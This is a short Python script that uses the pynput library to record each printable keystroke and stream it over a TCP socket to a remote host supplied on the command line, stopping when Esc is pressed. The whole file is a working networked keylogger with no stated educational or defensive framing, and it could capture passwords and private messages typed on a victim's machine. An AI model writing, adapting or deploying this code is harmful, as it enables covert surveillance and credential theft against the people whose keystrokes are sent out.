import socket
import sys

from pynput.keyboard import Key, Listener

def on_press(key):
    # non-function keys only, eg 'A'
    keyDec = str(key)[1]
    if 127 > ord(keyDec) > 32 and len(str(key)) == 3:
        # Convert the keycode to string, which is single-quoted, then to dec.
        sock.sendall(keyDec.encode())

def on_release(key):
    # Stop listener
    if key == Key.esc:
        print('closing socket')
        sock.close()
        return False

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = (sys.argv[1], 10000)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

with Listener(on_press=on_press, on_release=on_release) as listener:
   listener.join()